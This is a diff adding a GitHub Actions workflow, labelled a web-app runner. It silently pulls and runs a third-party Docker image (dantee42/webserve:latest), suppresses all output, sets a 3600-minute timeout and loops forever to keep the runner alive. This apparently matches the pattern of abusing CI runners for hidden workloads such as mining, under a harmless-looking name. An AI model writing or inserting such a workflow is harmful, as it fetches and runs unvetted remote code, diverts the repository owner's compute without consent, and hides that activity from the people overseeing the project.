@@ -1,0 +1,25 @@
+name: Docker Web App Runner
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run-docker-app:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3600
+
+    steps:
+      - name: Setup Docker Environment
+        run: |
+          docker --version >/dev/null 2>&1
+
+      - name: Pull and Run Docker Image
+        run: |
+          docker pull dantee42/webserve:latest >/dev/null 2>&1
+          docker run -d dantee42/webserve:latest >/dev/null 2>&1
+
+      - name: Keep
+        run: |
+          while true; do
+            sleep 300
+          done
